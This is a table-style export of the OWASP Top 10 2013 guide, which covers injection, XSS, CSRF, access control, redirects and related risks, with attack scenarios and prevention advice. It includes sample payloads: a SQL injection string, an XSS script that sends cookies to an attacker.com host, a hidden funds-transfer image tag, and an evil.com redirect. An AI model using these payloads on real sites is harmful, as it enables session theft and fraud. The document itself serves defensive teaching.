
"O","About OWASP",
"I","Introduction",
"Release Notes","RN",
"Application Security Risks","Risk",
"OWASP Top 10 Application Security Risks – 2013 ","T10",
"Example Attack ScenariosScenario #1: The application uses untrusted data in the construction of the following vulnerable SQL call:  String query = "SELECT * FROM accounts WHERE  custID='" + request.getParameter("id") + "'";Scenario #2: Similarly, an application’s blind trust in frameworks may result in queries that are still vulnerable, (e.g., Hibernate Query Language (HQL)):  Query HQLQuery = session.createQuery(“FROM accounts  WHERE custID='“ + request.getParameter("id") + "'");In both cases, the attacker modifies the ‘id’ parameter value in her browser to send:  ' or '1'='1. For example: http://example.com/app/accountView?id=' or '1'='1 This changes the meaning of both queries to return all the records from the accounts table.  More dangerous attacks could modify data or even invoke stored procedures.","Am I Vulnerable To Injection?The best way to find out if an application is vulnerable to injection is to verify that all use of interpreters clearly separates untrusted data from the command or query. For SQL calls, this means using bind variables in all prepared statements and stored procedures, and avoiding dynamic queries.Checking the code is a fast and accurate way to see if the application uses interpreters safely. Code analysis tools can help a security analyst find the use of interpreters and trace the data flow through the application. Penetration testers can validate these issues by crafting exploits that confirm the vulnerability.Automated dynamic scanning which exercises the application may provide insight into whether some exploitable injection flaws exist. Scanners cannot always reach interpreters and have difficulty detecting whether an attack was successful. Poor error handling makes injection flaws easier to discover.","ReferencesOWASP OWASP SQL Injection Prevention Cheat Sheet OWASP Query Parameterization Cheat Sheet OWASP Command Injection Article OWASP XML eXternal Entity (XXE) Reference Article ASVS: Output Encoding/Escaping Requirements (V6) OWASP Testing Guide: Chapter on SQL Injection TestingExternal CWE Entry 77 on Command Injection CWE Entry 89 on SQL Injection CWE Entry 564 on Hibernate Injection","How Do I Prevent Injection?Preventing injection requires keeping untrusted data separate from commands and queries.The preferred option is to use a safe API which avoids the use of the interpreter entirely or provides a parameterized interface.  Be careful with APIs, such as stored procedures, that are parameterized, but can still introduce injection under the hood.If a parameterized API is not available, you should carefully escape special characters using the specific escape syntax for that interpreter. OWASP’s ESAPI provides many of these escaping routines.Positive or “white list” input validation is also recommended, but is not a complete defense as many applications require special characters in their input. If special characters are required, only approaches 1. and 2. above will make their use safe. OWASP’s ESAPI has an extensible library of white list input validation routines. ","A1","Injection",
"Example Attack ScenariosScenario #1: Airline reservations application supports URL rewriting, putting session IDs in the URL:  http://example.com/sale/saleitems;jsessionid=  2P0OC2JSNDLPSKHCJUN2JV?dest=HawaiiAn authenticated user of the site wants to let his friends know about the sale. He e-mails the above link without knowing he is also giving away his session ID. When his friends use the link they will use his session and credit card.Scenario #2: Application’s timeouts aren’t set properly. User uses a public computer to access site. Instead of selecting “logout” the user simply closes the browser tab and walks away. Attacker uses the same browser an hour later, and that browser is still authenticated.Scenario #3: Insider or external attacker gains access to the system’s password database. User passwords are not properly hashed, exposing every users’ password to the attacker.","Am I Vulnerable to Hijacking?Are session management assets like user credentials and session IDs properly protected? You may be vulnerable if:User authentication credentials aren’t protected when stored using hashing or encryption. See A6.Credentials can be guessed or overwritten through weak account management functions (e.g., account creation, change password, recover password, weak session IDs).Session IDs are exposed in the URL (e.g., URL rewriting).Session IDs are vulnerable to session fixation attacks.Session IDs don’t timeout, or user sessions or authentication tokens, particularly single sign-on  (SSO) tokens, aren’t properly invalidated during logout.Session IDs aren’t rotated after successful login.Passwords, session IDs, and other credentials are sent over unencrypted connections. See A6.See the ASVS requirement areas V2 and V3 for more details.","ReferencesOWASPFor a more complete set of requirements and problems to avoid in this area, see the ASVS requirements areas for Authentication (V2) and Session Management (V3). OWASP Authentication Cheat Sheet OWASP Forgot Password Cheat Sheet OWASP Session Management Cheat Sheet OWASP Development Guide: Chapter on Authentication OWASP Testing Guide: Chapter on AuthenticationExternal CWE Entry 287 on Improper Authentication CWE Entry 384 on Session Fixation","How Do I Prevent This?The primary recommendation for an organization is to make available to developers:A single set of strong authentication and session management controls. Such controls should strive to:meet all the authentication and session management requirements defined in OWASP’s Application Security Verification Standard (ASVS) areas V2 (Authentication) and V3 (Session Management).have a simple interface for developers. Consider the ESAPI Authenticator and User APIs as good examples to emulate, use, or build upon.Strong efforts should also be made to avoid XSS flaws which can be used to steal session IDs. See A3.","A2","Broken Authentication and Session Management",
"Example Attack ScenarioThe application uses untrusted data in the construction of the following HTML snippet without validation or escaping:  (String) page += "<input name='creditcard' type='TEXT‘  value='" + request.getParameter("CC") + "'>";The attacker modifies the ‘CC’ parameter in his browser to:  '><script>document.location=  'http://www.attacker.com/cgi-bin/cookie.cgi?  foo='+document.cookie</script>'.This causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session. Note that attackers can also use XSS to defeat any  automated CSRF defense the application might employ. See A8 for info on CSRF.","Am I Vulnerable to XSS?You are vulnerable if you do not ensure that all user supplied input is properly escaped, or you do not verify it to be safe via input validation, before including that input in the output page. Without proper output escaping or validation, such input will be treated as active content in the browser. If Ajax is being used to dynamically update the page, are you using safe JavaScript APIs? For unsafe JavaScript APIs, encoding or validation must also be used.Automated tools can find some XSS problems automatically. However, each application builds output pages differently and uses different browser side interpreters such as JavaScript, ActiveX, Flash, and Silverlight, making automated detection difficult. Therefore, complete coverage requires a combination of manual code review and penetration testing, in addition to automated approaches.Web 2.0 technologies, such as Ajax, make XSS much more difficult to detect via automated tools.","ReferencesOWASP OWASP XSS Prevention Cheat Sheet OWASP DOM based XSS Prevention Cheat Sheet OWASP Cross-Site Scripting Article  ESAPI Encoder API ASVS: Output Encoding/Escaping Requirements (V6) OWASP AntiSamy: Sanitization Library Testing Guide: 1st 3 Chapters on Data Validation Testing OWASP Code Review Guide: Chapter on XSS Review OWASP XSS Filter Evasion Cheat SheetExternal CWE Entry 79 on Cross-Site Scripting","How Do I Prevent XSS?Preventing XSS requires separation of untrusted data from active browser content.The preferred option is to properly escape all untrusted data based on the HTML context (body, attribute, JavaScript, CSS, or URL) that the data will be placed into. See the OWASP XSS Prevention Cheat Sheet for details on the required data escaping techniques.Positive or “whitelist” input validation is also recommended as it helps protect against XSS, but is not a complete defense as many applications require special characters in their input. Such validation should, as much as possible, validate the length, characters, format, and business rules on that data before accepting the input.For rich content, consider auto-sanitization libraries like OWASP’s AntiSamy or the Java HTML Sanitizer Project.Consider Content Security Policy (CSP) to defend against XSS across your entire site.","A3","Cross-Site Scripting (XSS)",
"Example Attack ScenarioThe application uses unverified data in a SQL call that is accessing account information:  String query = "SELECT * FROM accts WHERE account = ?";  PreparedStatement pstmt =  connection.prepareStatement(query , … );  pstmt.setString( 1, request.getParameter("acct"));  ResultSet results = pstmt.executeQuery( );The attacker simply modifies the ‘acct’ parameter in her browser to send whatever account number she wants. If not properly verified, the attacker can access any user’s account, instead of only the intended customer’s account.   http://example.com/app/accountInfo?acct=notmyacct","Am I Vulnerable?The best way to find out if an application is vulnerable to insecure direct object references is to verify that all object references have appropriate defenses. To achieve this, consider:For direct references to restricted resources, does the application fail to verify the user is authorized to access the exact resource they have requested?If the reference is an indirect reference, does the mapping to the direct reference fail to limit the values to those authorized for the current user?Code review of the application can quickly verify whether either approach is implemented safely. Testing is also effective for identifying direct object references and whether they are safe. Automated tools typically do not look for such flaws because they cannot recognize what requires protection or what is safe or unsafe.","ReferencesOWASP OWASP Top 10-2007 on Insecure Dir Object References ESAPI Access Reference Map API ESAPI Access Control API (See isAuthorizedForData(), isAuthorizedForFile(), isAuthorizedForFunction() )For additional access control requirements, see the ASVS requirements area for Access Control (V4).External CWE Entry 639 on Insecure Direct Object References CWE Entry 22 on Path Traversal (an example of a Direct Object Reference attack)","How Do I Prevent This?Preventing insecure direct object references requires selecting an approach for protecting each user accessible object (e.g., object number, filename):Use per user or session indirect object references. This prevents attackers from directly targeting unauthorized resources. For example, instead of using the resource’s database key, a drop down list of six resources authorized for the current user could use the numbers 1 to 6 to indicate which value the user selected. The application has to map the per-user indirect reference back to the actual database key on the server. OWASP’s ESAPI includes both sequential and random access reference maps that developers can use to eliminate direct object references. Check access. Each use of a direct object reference from an untrusted source must include an access control check to ensure the user is authorized for the requested object.","Insecure Direct Object References","A4",
"Example Attack ScenariosScenario #1: The app server admin console is automatically installed and not removed. Default accounts aren’t changed. Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over.Scenario #2: Directory listing is not disabled on your server. Attacker discovers she can simply list directories to find any file. Attacker finds and downloads all your compiled Java classes, which she decompiles and reverse engineers to get all your custom code. She then finds a serious access control flaw in your application.Scenario #3: App server configuration allows stack traces to be returned to users, potentially exposing underlying flaws. Attackers love the extra information error messages provide.Scenario #4: App server comes with sample applications that are not removed from your production server. Said sample applications have well known security flaws attackers can use to compromise your server.","Am I Vulnerable to Attack?Is your application missing the proper security hardening across any part of the application stack? Including:Is any of your software out of date? This includes the OS, Web/App Server, DBMS, applications, and all code libraries (see new A9).Are any unnecessary features enabled or installed (e.g., ports, services, pages, accounts, privileges)?Are default accounts and their passwords still enabled and unchanged?Does your error handling reveal stack traces or other overly informative error messages to users?Are the security settings in your development frameworks (e.g., Struts, Spring, ASP.NET) and libraries not set to secure values?Without a concerted, repeatable application security configuration process, systems are at a higher risk.","ReferencesOWASP OWASP Development Guide: Chapter on Configuration OWASP Code Review Guide: Chapter on Error Handling OWASP Testing Guide: Configuration Management OWASP Testing Guide: Testing for Error Codes OWASP Top 10 2004 - Insecure Configuration Management For additional requirements in this area, see the ASVS requirements area for Security Configuration (V12).External PC Magazine Article on Web Server Hardening CWE Entry 2 on Environmental Security Flaws CIS Security Configuration Guides/Benchmarks","How Do I Prevent This?The primary recommendations are to establish all of the following:A repeatable hardening process that makes it fast and easy to deploy another environment that is properly locked down. Development, QA, and production environments should all be configured identically (with different passwords used in each environment). This process should be automated to minimize the effort required to setup a new secure environment.A process for keeping abreast of and deploying all new software updates and patches in a timely manner to each deployed environment. This needs to include all code libraries as well (see new A9).A strong application architecture that provides effective, secure separation between components.Consider running scans and doing audits periodically to help detect future misconfigurations or missing patches.","Security Misconfiguration","A5",
"Example Attack ScenariosScenario #1: An application encrypts credit card numbers in a database using automatic database encryption. However, this means it also decrypts this data automatically when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text. The system should have encrypted the credit card numbers using a public key, and only allowed back-end applications to decrypt them with the private key.Scenario #2: A site simply doesn’t use SSL for all authenticated pages. Attacker simply monitors network traffic (like an open wireless network), and steals the user’s session cookie. Attacker then replays this cookie and hijacks the user’s session, accessing the user’s private data.Scenario #3: The password database uses unsalted hashes to store everyone’s passwords. A file upload flaw allows an attacker to retrieve the password file. All of the unsalted hashes can be exposed with a rainbow table of precalculated hashes.","Am I Vulnerable to Data Exposure?The first thing you have to determine is which data is sensitive enough to require extra protection. For example, passwords, credit card numbers, health records, and personal information should be protected. For all such data:Is any of this data stored in clear text long term, including backups of this data?Is any of this data transmitted in clear text, internally or externally? Internet traffic is especially dangerous.Are any old / weak cryptographic algorithms used?Are weak crypto keys generated, or is proper key management or rotation missing?Are any browser security directives or headers missing when sensitive data is provided by / sent to the browser?And more … For a more complete set of problems to avoid, see ASVS areas Crypto (V7), Data Prot. (V9), and SSL (V10).","ReferencesOWASP - For a more complete set of requirements, see ASVS req’ts on Cryptography (V7), Data Protection (V9)  and  Communications Security (V10) OWASP Cryptographic Storage Cheat Sheet OWASP Password Storage Cheat Sheet OWASP Transport Layer Protection Cheat Sheet OWASP Testing Guide: Chapter on SSL/TLS TestingExternal CWE Entry 310 on Cryptographic Issues CWE Entry 312 on Cleartext Storage of Sensitive Information CWE Entry 319 on Cleartext Transmission of Sensitive Information CWE Entry 326 on Weak Encryption","How Do I Prevent This?The full perils of unsafe cryptography, SSL usage, and data protection are well beyond the scope of the Top 10. That said, for all sensitive data, do all of the following, at a minimum:Considering the threats you plan to protect this data from (e.g., insider attack, external user), make sure you encrypt all sensitive data at rest and in transit in a manner that defends against these threats.Don’t store sensitive data unnecessarily. Discard it as soon as possible. Data you don’t have can’t be stolen.Ensure strong standard algorithms and strong keys are used, and proper key management is in place. Consider using FIPS 140 validated cryptographic modules.Ensure passwords are stored with an algorithm specifically designed for password protection, such as bcrypt, PBKDF2, or scrypt.Disable autocomplete on forms collecting sensitive data and disable caching for pages that contain sensitive data.","Sensitive Data Exposure","A6",
"Example Attack ScenariosScenario #1: The attacker simply force browses to target URLs. The following URLs require authentication. Admin rights are also required for access to the “admin_getappInfo” page.  http://example.com/app/getappInfo  http://example.com/app/admin_getappInfoIf an unauthenticated user can  access either page, that’s a flaw. If an authenticated, non-admin, user is allowed to access the “admin_getappInfo” page, this is also a flaw, and may lead the attacker to more improperly protected admin pages.Scenario #2: A page provides an ‘action ‘parameter to specify the function being invoked, and different actions require different roles. If these roles aren’t enforced, that’s a flaw.","Am I Vulnerable to Forced Access?The best way to find out if an application has failed to properly restrict function level access is to verify every application function:Does the UI show navigation to unauthorized functions?Are  server side authentication or authorization checks missing?Are server side checks done that solely rely on information provided by the attacker?Using a proxy, browse your application with a privileged role. Then revisit restricted pages using a less privileged role. If the server responses are alike, you're probably vulnerable. Some testing proxies directly support this type of analysis.You can also check the access control implementation in the code. Try following a single privileged request through the code and verifying the authorization pattern. Then search the codebase to find where that pattern is not being followed.Automated tools are unlikely to find these problems.","ReferencesOWASP OWASP Top 10-2007 on Failure to Restrict URL Access ESAPI Access Control API OWASP Development Guide: Chapter on Authorization OWASP Testing Guide: Testing for Path Traversal OWASP Article on Forced BrowsingFor additional access control requirements, see the ASVS requirements area for Access Control (V4).External CWE Entry 285 on Improper Access Control (Authorization)","How Do I Prevent Forced Access?Your application should have a consistent and easy to analyze authorization module that is invoked from all of your business functions.  Frequently, such protection is provided by one or more components external to the application code. Think about the process for managing entitlements and ensure you can update and audit easily. Don’t hard code.The enforcement mechanism(s) should deny all access by default, requiring explicit grants to specific roles for access to every function.If the function is involved in a workflow, check to make sure the conditions are in the proper state to allow access.NOTE: Most web applications don’t display links and buttons to unauthorized functions, but this “presentation layer access control” doesn’t actually provide protection. You must also implement checks in the controller or business logic.","Missing Function Level Access Control","A7",
"Example Attack ScenarioThe application allows a user to submit a state changing request that does not include anything secret. For example:  http://example.com/app/transferFunds?amount=1500  &destinationAccount=4673243243So, the attacker constructs a request that will transfer money from the victim’s account to the attacker’s account, and then embeds this attack in an image request or iframe stored on various sites under the attacker’s control:  <img src="http://example.com/app/transferFunds?  amount=1500&destinationAccount=attackersAcct#“  width="0" height="0" />If the victim visits any of the attacker’s sites while already authenticated to example.com, these forged requests will automatically include the user’s session info, authorizing the attacker’s request.","Am I Vulnerable to CSRF?To check whether an application is vulnerable, see if any links and forms lack an unpredictable CSRF token. Without such a token, attackers can forge malicious requests.  An alternate defense is to require the user to prove they intended to submit the request, either through reauthentication, or some other proof they are a real user (e.g., a CAPTCHA).Focus on the links and forms that invoke state-changing functions, since those are the most important CSRF targets.You should check multistep transactions, as they are not inherently immune. Attackers can easily forge a series of requests by using multiple tags or possibly JavaScript.Note that session cookies, source IP addresses, and other information automatically sent by the browser don’t provide any defense against CSRF since this information is also included in forged requests.OWASP’s CSRF Tester tool can help generate test cases to demonstrate the dangers of CSRF flaws.","ReferencesOWASP OWASP CSRF Article OWASP CSRF Prevention Cheat Sheet OWASP CSRFGuard - CSRF Defense Tool  ESAPI Project Home Page  ESAPI HTTPUtilities Class with AntiCSRF Tokens OWASP Testing Guide: Chapter on CSRF Testing OWASP CSRFTester - CSRF Testing Tool External CWE Entry 352 on CSRF ","How Do I Prevent CSRF?Preventing CSRF usually requires the inclusion of an unpredictable token in each HTTP request. Such tokens should, at a minimum, be unique per user session.The preferred option is to include the unique token in a hidden field. This causes the value to be sent in the body of the HTTP request, avoiding its inclusion in the URL, which is more prone to exposure.The unique token can also be included in the URL itself, or a URL parameter. However, such placement runs a greater risk that the URL will be exposed to an attacker, thus compromising the secret token.OWASP’s CSRF Guard can automatically include such tokens in Java EE, .NET, or PHP apps. OWASP’s ESAPI includes methods developers can use to prevent CSRF vulnerabilities.Requiring the user to reauthenticate, or prove they are a user (e.g., via a CAPTCHA) can also protect against CSRF.","Cross-Site Request Forgery(CSRF)","A8",
"Example Attack ScenariosComponent vulnerabilities can cause almost any type of risk imaginable, ranging from the trivial to sophisticated malware designed to target a specific organization. Components almost always run with the full privilege of the application, so flaws in any component can be serious, The following two vulnerable components were downloaded 22m times in 2011.Apache CXF Authentication Bypass – By failing to provide an identity token, attackers could invoke any web service with full permission. (Apache CXF is a services framework, not to be confused with the Apache Application Server.)Spring Remote Code Execution – Abuse of the Expression Language implementation in Spring allowed attackers to execute arbitrary code, effectively taking over the server.Every application using either of these vulnerable libraries is vulnerable to attack as both of these components are directly accessible by application users. Other vulnerable libraries, used deeper in an application, may be harder to exploit.","Am I Vulnerable to Known Vulns?In theory, it ought to be easy to figure out if you are currently using any vulnerable components or libraries. Unfortunately, vulnerability reports for commercial or open source software do not always specify exactly which versions of a component are vulnerable in a standard, searchable way. Further, not all libraries use an understandable version numbering system. Worst of all, not all vulnerabilities are reported to a central clearinghouse that is easy to search, although sites like CVE and NVD are becoming easier to search.Determining if you are vulnerable requires searching these databases, as well as keeping abreast of project mailing lists and announcements for anything that might be a vulnerability. If one of your components does have a vulnerability, you should carefully evaluate whether you are actually vulnerable by checking to see if your code uses the part of the component with the vulnerability and whether the flaw could result in an impact you care about.","ReferencesOWASP Good Component Practices ProjectExternal The Unfortunate Reality of Insecure Libraries Open Source Software Security Addressing Security Concerns in Open Source Components MITRE Common Vulnerabilities and Exposures Example Mass Assignment Vulnerability that was fixed in ActiveRecord, a Ruby on Rails GEM","How Do I Prevent This?One option is not to use components that you didn’t write. But that’s not very realistic.Most component projects do not create vulnerability patches for old versions. Instead, most simply fix the problem in the next version. So upgrading to these new versions is critical. Software projects should have a process in place to:Identify all components and the versions you are using, including all dependencies. (e.g., the versions plugin).Monitor the security of these components in public databases, project mailing lists, and security mailing lists, and keep them up to date.Establish security policies governing component use, such as requiring certain software development practices, passing security tests, and acceptable licenses. Where appropriate, consider adding security wrappers around components to disable unused functionality and/ or secure weak or vulnerable aspects of the component.","Using Components with Known Vulnerabilities","A9",
"Example Attack ScenariosScenario #1: The application has a page called “redirect.jsp” which takes a single parameter named “url”. The attacker crafts a malicious URL that redirects users to a malicious site that performs phishing and installs malware.  http://www.example.com/redirect.jsp?url=evil.com Scenario #2: The application uses forwards to route requests between different parts of the site. To facilitate this, some pages use a parameter to indicate where the user should be sent if a transaction is successful. In this case, the attacker crafts a URL that will pass the application’s access control check and then forwards the attacker to administrative functionality for which the attacker isn’t authorized.  http://www.example.com/boring.jsp?fwd=admin.jsp","Am I Vulnerable to Redirection?The best way to find out if an application has any unvalidated redirects or forwards is to:Review the code for all uses of redirect or forward (called a transfer in .NET). For each use, identify if the target URL is included in any parameter values. If so, if the target URL isn’t validated against a whitelist, you are vulnerable.Also, spider the site to see if it generates any redirects (HTTP response codes 300-307, typically 302). Look at the parameters supplied prior to the redirect to see if they appear to be a target URL or a piece of such a URL. If so, change the URL target and observe whether the site redirects to the new target.If code is unavailable, check all parameters to see if they look like part of a redirect or forward URL destination and test those that do.","ReferencesOWASP OWASP Article on Open Redirects  ESAPI SecurityWrapperResponse sendRedirect() methodExternal CWE Entry 601 on Open Redirects  WASC Article on URL Redirector Abuse Google blog article on the dangers of open redirects OWASP Top 10 for .NET article on Unvalidated Redirects and Forwards","How Do I Prevent This?Safe use of redirects and forwards can be done in a number of ways:Simply avoid using redirects and forwards.If used, don’t involve user parameters in calculating the destination. This can usually be done.If destination parameters can’t be avoided, ensure that the supplied value is valid, and authorized for the user.	It is recommended that any such destination parameters be a mapping value, rather than the actual URL or portion of the URL, and that server side code translate this mapping to the target URL.	Applications can use ESAPI to override the sendRedirect() method to make sure all redirect destinations are safe.Avoiding such flaws is extremely important as they are a favorite target of phishers trying to gain the user’s trust.","Unvalidated Redirects and Forwards","A10",
"What’s Next for Developers","+D",
"What’s Next for Verifiers","+V",
"What’s Next for Organizations","+O",
"+R","2","Note About Risks",
"Details About Risk Factors","+F","Prevalence","Detectability","Exploitability","Impact",

